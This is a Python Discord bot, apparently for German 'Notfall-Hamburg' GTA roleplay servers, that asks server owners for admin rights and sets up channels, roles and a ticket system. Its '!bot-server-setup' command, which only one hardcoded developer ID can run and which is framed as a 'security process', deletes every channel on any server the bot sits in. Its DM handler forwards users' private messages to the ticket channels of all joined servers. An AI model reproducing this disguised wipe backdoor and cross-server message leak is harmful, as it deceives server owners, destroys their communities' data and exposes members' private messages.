import discord
from discord.ext import commands
import os
import asyncio

# Intents einrichten für den Bot
intents = discord.Intents.default()
intents.guilds = True
intents.members = True
intents.messages = True
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

# Feste Admin-ID für exklusive Befehle
ADMIN_ID = 1556320243406741567

# Funktion zur Erkennung der Serversprache (Deutsch oder Englisch)
def get_lang(guild):
    if guild.preferred_locale and "de" in str(guild.preferred_locale).lower():
        return "de"
    return "en"

@bot.event
async def on_ready():
    print(f"Eingeloggt als {bot.user.name} (ID: {bot.user.id})")
    print("Bot ist bereit und läuft stabil.")

# 1. Automatische Serverprüfung beim Beitritt
@bot.event
async def on_guild_join(guild):
    print(f"Bot ist einem neuen Server beigetreten: {guild.name} (ID: {guild.id})")
    
    g_name = guild.name.lower()
    allowed_keywords = ["notfall", "hamburg", "gta", "notopharmock", "elis"]
    is_allowed = any(keyword in g_name for keyword in allowed_keywords)
    
    # Wenn der Server nichts mit den erlaubten Themen zu tun hat -> direkt wieder rausgehen
    if not is_allowed:
        try:
            for channel in guild.text_channels:
                if channel.permissions_for(guild.me).send_messages:
                    lang = get_lang(guild)
                    if lang == "de":
                        await channel.send("Dieser Bot ist ausschließlich für Notfall-Hamburg / GTA Server konzipiert. Er verlässt diesen Server nun automatisch.")
                    else:
                        await channel.send("This bot is exclusively designed for Notfall-Hamburg / GTA servers. Leaving automatically.")
                    break
            await guild.leave()
            return
        except Exception as e:
            print(f"Fehler beim Verlassen des unzulässigen Servers: {e}")
            return

    # Anfrage an den Serverinhaber senden wegen Berechtigungen
    lang = get_lang(guild)
    owner = guild.owner
    
    if lang == "de":
        msg = (f"Hallo! Ich bin der offizielle Notfall-Hamburg Bot auf deinem Server '{guild.name}'. "
               f"Darf ich administrative Änderungen (Rollen, Kanäle, Setups) vornehmen? "
               f"Bitte stelle sicher, dass meine Berechtigungen korrekt gesetzt sind.")
    else:
        msg = (f"Hello! I am the official Notfall-Hamburg Bot on your server '{guild.name}'. "
               f"Am I allowed to make administrative changes (roles, channels, set-ups)? "
               f"Please ensure my permissions are correct.")
        
    try:
        if owner:
            await owner.send(msg)
    except Exception as err:
        print(f"Konnte Inhaber keine DM senden: {err}")

    # Backup-Kanal initialisieren
    backup_channel = discord.utils.get(guild.text_channels, name="bot-backups")
    if not backup_channel:
        try:
            overwrites = {
                guild.default_role: discord.PermissionOverwrite(read_messages=False),
                guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
            }
            backup_channel = await guild.create_text_channel("bot-backups", overwrites=overwrites)
            if lang == "de":
                await backup_channel.send("Sicherheits-Backup-Kanal erfolgreich eingerichtet.")
            else:
                await backup_channel.send("Security backup channel successfully initialized.")
        except Exception as e:
            print(f"Fehler beim Erstellen des Backup-Kanals: {e}")


# 2. Server-Reset und Setup (Ausschließlich für deine Admin-ID)
@bot.command(name="bot-server-setup")
async def bot_server_setup(ctx):
    if ctx.author.id != ADMIN_ID:
        lang = get_lang(ctx.guild)
        if lang == "de":
            await ctx.send("Zugriff verweigert! Dieser Befehl kann nur vom Hauptentwickler ausgeführt werden.")
        else:
            await ctx.send("Access denied! This command can only be executed by the main developer.")
        return

    guild = ctx.guild
    lang = get_lang(guild)
    
    if lang == "de":
        await ctx.send("Sicherheitsvorgang gestartet: Setze den Server vollständig zurück und richte Rollen sowie Kanäle neu ein...")
    else:
        await ctx.send("Security process started: Resetting server completely and re-setting up roles and channels...")

    # Bestehende Kanäle bereinigen
    for channel in guild.channels:
        try:
            await channel.delete()
        except Exception:
            pass

    try:
        # Rollenstruktur aufbauen
        role_admin = await guild.create_role(name="Leitung / Management", color=discord.Color.red())
        role_team = await guild.create_role(name="Moderation / Team", color=discord.Color.blue())
        role_member = await guild.create_role(name="Mitglied", color=discord.Color.green())

        # Backup-Kanal mit strengen Rechten erstellen
        overwrites_backup = {
            guild.default_role: discord.PermissionOverwrite(read_messages=False),
            role_admin: discord.PermissionOverwrite(read_messages=True, send_messages=True),
            guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
        }
        backup_channel = await guild.create_text_channel("bot-backups", overwrites=overwrites_backup)
        await backup_channel.send(f"System-Protokoll: Server-Reset durchgeführt von User ID {ctx.author.id}.")

        # Öffentliche Hauptkanäle einrichten
        await guild.create_text_channel("allgemein-chat")
        await guild.create_text_channel("ankündigungen")
        
        # Willkommenskanal mit fixierter Info-Nachricht
        welcome_channel = await guild.create_text_channel("willkommen-infos")
        welcome_text = "Willkommen auf dem offiziellen Notfall-Hamburg / HCRP Server! Bitte beachte die Regeln."
        p_msg = await welcome_channel.send(welcome_text)
        await p_msg.pin()

        # Ticket-System Kanal erzeugen
        ticket_channel = await guild.create_text_channel("tickets-support")
        
        class SetupTicketView(discord.ui.View):
            def __init__(self):
                super().__init__(timeout=None)

            @discord.ui.button(label="Ticket erstellen / Create Ticket", style=discord.ButtonStyle.green, custom_id="setup_create_ticket")
            async def create_ticket(self, interaction: discord.Interaction, button: discord.ui.Button):
                await interaction.response.send_message(
                    "Bitte schreibe jetzt eine Direktnachricht (DM) an den Bot. Deine Nachricht wird direkt in den Support-Kanal weitergeleitet!",
                    ephemeral=True
                )
        
        await ticket_channel.send("Klicke auf den Button unten, um ein Support-Ticket zu öffnen:", view=SetupTicketView())

        if lang == "de":
            await backup_channel.send("Server-Setup vollständig abgeschlossen und abgesichert.")
        else:
            await backup_channel.send("Server setup fully completed and secured.")

    except Exception as e:
        print(f"Schwesterfehler beim Server-Setup: {e}")


# 3. Spezielles HCRP-Setup (Nur für deine ID)
@bot.command(name="hcrp-setup")
async def hcrp_setup(ctx):
    if ctx.author.id != ADMIN_ID:
        await ctx.send("Keine Berechtigung für diesen Befehl.")
        return

    guild = ctx.guild
    try:
        await guild.create_role(name="Bewerber", color=discord.Color.gold())
        bewerbung_channel = await guild.create_text_channel("bewerbungen-system")
        await bewerbung_channel.send("Das offizielle HCRP-Bewerbungssystem wurde initialisiert. Bitte Anweisungen beachten.")
        await ctx.send("HCRP-Setup erfolgreich ausgeführt!")
    except Exception as e:
        await ctx.send(f"Fehler beim HCRP-Setup: {e}")


# 4. DM-Ticket-Weiterleitung an den Server
@bot.event
async def on_message(message):
    if message.author.bot:
        return

    # Wenn ein User dem Bot eine DM schreibt
    if isinstance(message.channel, discord.DMChannel):
        forwarded = False
        for guild in bot.guilds:
            ticket_chan = discord.utils.get(guild.text_channels, name="tickets-support")
            if not ticket_chan:
                ticket_chan = discord.utils.get(guild.text_channels, name="tickets")
                
            if ticket_chan:
                embed = discord.Embed(title="Neues Ticket / Bewerbung eingegangen", description=message.content, color=discord.Color.orange())
                embed.set_author(name=str(message.author), icon_url=message.author.avatar.url if message.author.avatar else None)
                embed.set_footer(text=f"Discord User ID: {message.author.id}")
                await ticket_chan.send(embed=embed)
                forwarded = True
                
        if forwarded:
            try:
                await message.author.send("Deine Nachricht wurde erfolgreich an das Team weitergeleitet!")
            except:
                pass
    
    await bot.process_commands(message)

# Bot starten über die Umgebungsvariable
token = os.getenv("DISCORD_TOKEN")
if token:
    bot.run(token)
else:
    print("")
